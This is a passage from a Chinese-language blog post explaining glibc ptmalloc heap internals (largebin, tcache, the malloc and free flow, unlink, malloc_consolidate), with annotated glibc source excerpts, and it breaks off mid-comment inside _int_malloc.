<p>[[./heap-all-in-one/smallbin1.png]] #### largebin * 大小：大于<code>0x400</code> * 个数：<code>63</code>个 * 使用<code>fd_nextsize</code>，<code>bk_nextsize</code>连接 * 同一个<code>largebin</code>中每个<code>chunk</code>的大小可以不一样 * <code>large chunk</code>可以添加、删除在<code>large bin</code>的任何一个位置 * 同一个<code>largebin</code>中的所有<code>chunk</code>按照大小进行从大到小的排列：最大的<code>chunk</code>放在一个链表的链头，最小的<code>chunk</code>放在链尾；相同大小的<code>chunk</code>按照最近使用顺序排序 * 对比链表链头<code>chunk</code>的<code>size</code>，如果足够大，就从链尾开始遍历该<code>large bin</code>，找到第一个<code>size</code>相等或接近的<code>chunk</code>进行分配，如果该<code>chunk</code>大于用户请求的<code>size</code>的话，就将该<code>chunk</code>拆分为两个<code>chunk</code>：前者进行分配并且<code>size</code>等同于用户请求的<code>size</code>；剩余的部分做为一个新的<code>chunk</code>添加到<code>unsorted bin</code>中 - 如果该<code>large bin</code>中最大的<code>chunk</code>的<code>size</code>小于用户请求的<code>size</code>的话，那么就通过<code>binmap</code>找到了下一个非空的<code>large bin</code>的话，按照上一段中的方法分配<code>chunk</code>，无法找到则使用<code>top chunk</code>来分配合适的内存 * <code>free</code>操作类似于<code>smallbin</code></p>
<table>
<thead>
<tr class="header">
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>1</td>
<td>32</td>
<td>64</td>
</tr>
<tr class="even">
<td>2</td>
<td>16</td>
<td>512</td>
</tr>
<tr class="odd">
<td>3</td>
<td>8</td>
<td>4096</td>
</tr>
<tr class="even">
<td>4</td>
<td>4</td>
<td>32768</td>
</tr>
<tr class="odd">
<td>5</td>
<td>2</td>
<td>262144</td>
</tr>
<tr class="even">
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody>
</table>
<h4 id="tcache">tcache</h4>
<ul>
<li>类似<code>fastbin</code></li>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li>
<li><code>free</code> 内存，且 <code>size</code> 小于 <code>small bin size</code> 时
<ul>
<li><code>tcache</code> 之前会放到 <code>fastbin</code> 或者 <code>unsorted bin</code> 中</li>
<li><code>tcache</code> 后：
<ul>
<li>先放到对应的 <code>tcache</code> 中，直到被填满（默认是 7 个）</li>
<li>填满之后放到 <code>fastbin</code> 或者 <code>unsorted bin</code> 中</li>
<li><code>tcache</code> 中的 <code>chunk</code> 不会合并（不取消 <code>inuse bit</code></li>
</ul></li>
</ul></li>
<li><code>malloc</code> 内存，且 <code>size</code> 在 <code>tcache</code> 范围内
<ul>
<li>先从 <code>tcache</code> 取 <code>chunk</code>，直到 <code>tcache</code> 为空，再从 <code>bin</code> 中找</li>
<li><code>tcache</code> 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 <code>size</code> 符合的 <code>chunk</code>，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 <code>chunk</code> 放到 <code>tcache</code> 中，直到填满。之后再从 <code>tcache</code> 中取；因此 <code>chunk</code> 在 <code>bin</code> 中和 <code>tcache</code> 中的顺序会反过来</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./heap-all-in-one/tcache1.png"
                      
                ></li>
</ul>
<h3 id="堆的初始化和管理流程">堆的初始化和管理流程</h3>
<h4 id="malloc">malloc</h4>
<ul>
<li><p>第一次调用 <code>malloc</code>申请堆空间：首先会跟着 <code>hook</code> 指针进入 <code>malloc_hook_ini()</code> 函数里面进行对 <code>ptmalloc</code> 的初始化工作，并置空 <code>hook</code>，再调用 <code>ptmalloc_init()</code> 和 <code>__libc_malloc()</code></p></li>
<li><p>再次调用 <code>malloc</code> 申请堆空间：<code>malloc()</code> -&gt; <code>__libc_malloc()</code> -&gt; <code>_int_malloc()</code></p></li>
<li><p><code>checked_request2size</code>将请求内存大小转换为实际大小</p></li>
<li><p>先尝试从<code>fastbins</code>中分配出去<code>(0x80)</code></p></li>
<li><p>再尝试从<code>smallbins</code>中分配出去<code>(0x400)</code></p>
<ul>
<li><code>smallbins</code>还没有初始化则进行<code>malloc_consolidate</code>
<ul>
<li>若<code>malloc_state</code>的<code>fastbin</code>为空，则对整个<code>malloc_state</code>初始化</li>
<li><code>malloc_init_state(av)</code>先初始化除<code>fastbin</code>以外的所有的<code>bins</code>初始化，在初始化<code>fastbin</code></li>
</ul></li>
</ul></li>
<li><p>进行<code>malloc_consolidate</code>，将<code>fastbins</code>中的<code>chunk</code>转移到<code>unsortedbin</code>中</p>
<ul>
<li>没有初始化<code>ptmalloc</code>则初始化<code>ptmalloc</code></li>
<li>当前<code>chunk</code>的<code>prev_inuse</code>位为<code>0</code>就会进行后向合并</li>
<li>当前<code>chunk</code>的相邻高地址<code>chunk</code>是空闲的则进行前向合并</li>
<li>当前<code>chunk</code>的下一个<code>chunk</code>如果不为<code>top chunk</code>，则将<code>chunk</code>放入<code>unsortedbin</code>头
<ul>
<li>如果为<code>largebin</code>则将<code>fd_nextsize</code>和<code>bk_nextsize</code>置为<code>NULL</code></li>
</ul></li>
<li>当前<code>chunk</code>的下一个<code>chunk</code>如果为<code>top chunk</code>，则将当前<code>chunk</code>合并入<code>top chunk</code></li>
<li>遍历完每一条<code>fastbins</code>的<code>bin</code>链</li>
</ul></li>
<li><p>遍历 <code>unsortedbin</code> 中的 <code>chunk</code></p>
<ul>
<li>如果 <code>unsortedbin</code> 只有一个<code>chunk</code>，并且这个<code>chunk</code> 在上次分配时被使用过，并且所需分配的 <code>chunk</code> 大小属于 <code>smallbins</code>，且 <code>chunk</code> 的大小大于等于需要分配的大小，这种情况下就直接将该 <code>chunk</code> 进行切割，剩下的部分继续留在 <code>unsortedbin</code> 里</li>
<li>否则会从后往前一直整理这些<code>chunk</code>，根据 <code>chunk</code> 的空间大小将其放入所属 <code>smallbin</code> 链或是 <code>largebin</code> 链中，一直整理直到遇到 <code>chunk_size = nb</code> 的 chunk，或者说整理到 bin 链为空
<ul>
<li><code>unsortedbin</code> 链里有多个 <code>chunk</code> 的情况时，<code>chunk</code> 不是直接在 <code>unsortedbin</code> 里面被切割的</li>
<li>如果是只有一个的话就是直接切割</li>
</ul></li>
</ul></li>
<li><p>遍历 <code>smallbins</code> 和 <code>largebins</code>，按照 <code>smallest-first，best-fit</code> 原则，找一个合适的 <code>chunk</code>，从中划分一块所需大小的 <code>chunk</code>，并将剩下的部分链入到 <code>unsortedbin</code> 中</p></li>
<li><p>尝试从 <code>top chunk</code> 中分配所需 <code>chunk</code></p></li>
<li><p>还没能分配成功的话就到 <code>sbrk</code>, <code>mmap</code> 了</p></li>
</ul>
<h4 id="free">free</h4>
<ul>
<li>检查<code>free_hook</code>是否为空，不为空则执行这个函数指针指向的函数，执行后返回</li>
<li>检查被<code>free</code>的<code>addr</code>是否为<code>0</code>，为零直接返回</li>
<li>修改<code>addr</code>指向<code>chunk</code>头</li>
<li>检查是否由<code>mmap</code>分配，是则单独处理，调用<code>munmap_chunk()</code>释放内存</li>
<li>获取该<code>chunk</code>的<code>arena</code>调用<code>_int_free</code>传入<code>arena_ptr</code>，<code>chunk_addr</code>，<code>0</code>(一个锁)</li>
<li>检查是否能被链入<code>fastbin</code></li>
<li>进行一系列检查
<ul>
<li>先获得分配区的锁</li>
<li><code>free</code>的<code>chunk</code>不能是<code>top chunk</code></li>
<li><code>free</code>的<code>chunk</code>是通过<code>sbrk()</code>分配的，且下一个相邻的<code>chunk</code>地址不能超过了<code>top chunk</code></li>
<li><code>free</code>的<code>chunk</code>的下一个相邻的<code>chunk</code>的<code>size</code>的标志位要标志当前<code>free chunk</code>处于<code>inuse</code></li>
<li><code>free</code> 的<code>chunk</code>的下一个相邻 <code>chunk</code> 的大小，该大小要大于等于 <code>2*SIZE_SZ</code> 并且小于分配区所分配区的内存总量</li>
</ul></li>
<li>判断是链入<code>fastbin</code>还是与<code>top_chunk</code>合并</li>
<li><code>chunk</code>覆盖垃圾数据，将<code>chunk</code>链入<code>fastbin</code>，<code>double free</code>检查等</li>
<li>检查前一个堆是否空闲，空闲的话前向合并</li>
<li>检查后一个堆是否为<code>top chunk</code>，是否空闲，空闲的话后向合并</li>
<li>合并的堆块如果和<code>top chunk</code>相连则直接合并，否则放入<code>unsortedbin</code>中并进行检查</li>
<li>进行<code>malloc_consolidate</code></li>
<li>进行一系列操作
<ul>
<li>如果合并后的<code>chunk</code>大小大于<code>0x10000</code>，并且<code>fastbins</code>存在空闲<code>chunk</code>，调用<code>malloc_consolidate</code></li>
<li><code>top chunk</code>大小大于<code>heap</code>收缩阈值，则收缩</li>
<li>获得了分配区的锁则对分配区解锁</li>
</ul></li>
<li>大块内存单独处理</li>
</ul>
<h4 id="unlink">unlink</h4>
<ul>
<li>使用场景：
<ul>
<li><code>malloc</code>
<ul>
<li><code>large bin</code></li>
<li>遍历<code>unsortedbin</code></li>
<li>从比请求的<code>chunk</code>所在的<code>bin</code>大的<code>bin</code>中取<code>chunk</code></li>
</ul></li>
<li><code>free</code>
<ul>
<li>后向合并（合并物理相邻低地址空闲<code>chunk</code>)</li>
<li>前向合并（除了<code>top chunk</code>）</li>
</ul></li>
<li><code>malloc_consolidate</code>
<ul>
<li>同<code>free</code></li>
</ul></li>
<li><code>realloc</code>
<ul>
<li>前向拓展（除了<code>top chunk</code>）</li>
</ul></li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./heap-all-in-one/unlink1.png"
                      
                ></li>
</ul>
<h4 id="malloc_consolidate">malloc_consolidate</h4>
<ul>
<li>触发点：
<ul>
<li><code>_int_malloc_</code>：一个<code>size</code>在<code>smallbin、largebin</code>的<code>chunk</code>正在被分配，或没有适合的<code>bins</code>被寻找重新申请回去并且<code>top chunk</code>太小了不能满足<code>malloc</code>的申请</li>
<li><code>_int_free</code>：如果这个<code>chunk</code>不小于<code>FASTBIN_CONSOLIDATION_THRESHOLD (65536)</code></li>
<li><code>malloc_trim</code>：总是调用</li>
<li><code>_int_mallnfo</code></li>
<li><code>mallopt</code>：总是调用</li>
</ul></li>
<li><code>_int_malloc_(large size)</code>
<ul>
<li><code>fastbin</code>中堆与<code>top chunk</code>相邻</li>
<li><code>fastbin</code>中堆不与<code>top chunk</code>相邻</li>
<li>合并<code>fastbin</code>中物理相邻的堆块（不同大小也可以） ### malloc_state</li>
</ul></li>
</ul>
<p><strong>main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span> </span><br><span class="line">	<span class="comment">/* Serialize access. */</span></span><br><span class="line">	__libc_lock_define(, mutex);</span><br><span class="line">	<span class="comment">/* Flags (formerly in max_fast). */</span> </span><br><span class="line">	<span class="type">int</span> flags; <span class="comment">/* Fastbins */</span> </span><br><span class="line">	mfastbinptr fastbinsY[ NFASTBINS ]; </span><br><span class="line">	<span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span> </span><br><span class="line">	mchunkptr top; </span><br><span class="line">	<span class="comment">/* The remainder from the most recent split of a small request */</span> </span><br><span class="line">	mchunkptr last_remainder; </span><br><span class="line">	<span class="comment">/* Normal bins packed as described above */</span> </span><br><span class="line">	mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ]; </span><br><span class="line">	<span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span> </span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> binmap[ BINMAPSIZE ]; </span><br><span class="line">	<span class="comment">/* Linked list, points to the next arena */</span> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span> </span><br><span class="line">	<span class="comment">/* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */</span> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span> </span><br><span class="line">	<span class="comment">/* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */</span> </span><br><span class="line">	INTERNAL_SIZE_T attached_threads; </span><br><span class="line">	<span class="comment">/* Memory allocated from the system in this arena. */</span> </span><br><span class="line">	INTERNAL_SIZE_T system_mem; </span><br><span class="line">	INTERNAL_SIZE_T max_system_mem; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h3 id="heap_info">*heap_info</h3>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_MIN_SIZE (32 * 1024) </span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HEAP_MAX_SIZE </span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> DEFAULT_MMAP_THRESHOLD_MAX</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX) </span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span> </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> HEAP_MAX_SIZE (1024 * 1024) <span class="comment">/* must be a power of two */</span> </span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"><span class="comment">/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps that are dynamically created for multi-threaded programs. The maximum size must be a power of two, for fast determination of which heap belongs to a chunk. It should be much larger than the mmap threshold, so that requests with a size just below that threshold can be fulfilled without creating too many heaps. */</span> </span><br><span class="line"><span class="comment">/***************************************************************************/</span> </span><br><span class="line"><span class="comment">/* A heap is a single contiguous memory region holding (coalesceable) malloc_chunks. It is allocated with mmap() and always starts at an address aligned to HEAP_MAX_SIZE. */</span> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">	mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span> </span><br><span class="line">	<span class="type">size_t</span> size; <span class="comment">/* Current size in bytes. */</span> </span><br><span class="line">	<span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */</span> </span><br><span class="line">	<span class="comment">/* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */</span> </span><br><span class="line">	<span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; </span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure></div>
<h3 id="源代码">源代码</h3>
<h4 id="libc_malloc">__libc_malloc</h4>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//首先检查是否存在内存分配的 hook 函数，如果存在，调用 hook 函数，并返回，hook 函数主要用于进程在创建新线程过程中分配内存，或者支持用户提供的内存分配函数。</span></span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook)(<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read(__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取分配区指针，如果获取分配区失败，返回退出，否则，调用 _int_malloc() 函数分配内存。</span></span><br><span class="line">  arena_get(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">  <span class="comment">//如果 _int_malloc() 函数分配内存失败，就会判断使用的分配区是不是主分配区，然后是一些获取分配区，解锁之类的操作。</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    LIBC_PROBE(memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = arena_get_retry(ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||</span><br><span class="line">         ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="malloc_hook">__malloc_hook</h4>
<p><code>__malloc_hook</code> 指向 <code>malloc_hook_ini</code>，该函数为 ptmalloc 的初始化函数。主要用于初始化全局状态机和 chunk 的数据结构，首先来看看 <code>malloc_hook_ini</code> 函数 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">* 初始化。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"></span><br><span class="line"><span class="title function_">malloc_hook_ini</span> <span class="params">(<span class="type">size_t</span> sz, <span class="type">const</span> <span class="type">void</span> *caller)</span>&#123;</span><br><span class="line">    <span class="comment">//先将 malloc_hook 的值设置为 NULL，然后调用 ptmalloc_init 函数，最后又回调了 libc_malloc 函数。</span></span><br><span class="line">    __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line">    <span class="keyword">return</span> __libc_malloc (sz);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div> #### _int_malloc <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc(mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb; <span class="comment">/* 符合要求的请求大小 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;   <span class="comment">/* 相关的bin指数 */</span></span><br><span class="line">  mbinptr bin;        <span class="comment">/* 相关的bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;     <span class="comment">/* 检查/选择的块 */</span></span><br><span class="line">  INTERNAL_SIZE_T size; <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;     <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;          <span class="comment">/* 被分割的剩余部分 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size; <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block; <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;   <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;   <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd; <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck; <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size(bytes, nb);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">   This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">   can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast()))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//根据所需 chunk 的大小获得该 chunk 所属 fast bin 的 index。</span></span><br><span class="line">  idx = fastbin_index(nb);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//从链中取出第一个 chunk，并调用 chunk2mem() 函数返回用户所需的内存块。</span></span><br><span class="line">  mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">  mchunkptr pp = *fb;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim = pp;</span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim);</span><br><span class="line">  <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    check_remalloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">   hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">   (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">   processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">   anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">&#123;</span><br><span class="line">  idx = smallbin_index(nb);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//根据 index 获得某个 small bin 的空闲 chunk 双向循环链表表头,在 if 语句里将最后一个 chunk 赋值给 victim。</span></span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line">  <span class="comment">//如果 victim 与表头相同，表示该链表为空，不能从 small bin 的空闲 chunk 链表中分配。</span></span><br><span class="line">  <span class="comment">//下面都是 victim 与表头不相同的情况。</span></span><br><span class="line">  <span class="keyword">if</span> ((victim = last(bin)) != bin)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//如果 victim 为 0，表示所属 small bin 还没有初始化为双向循环链表，调用 malloc_consolidate() 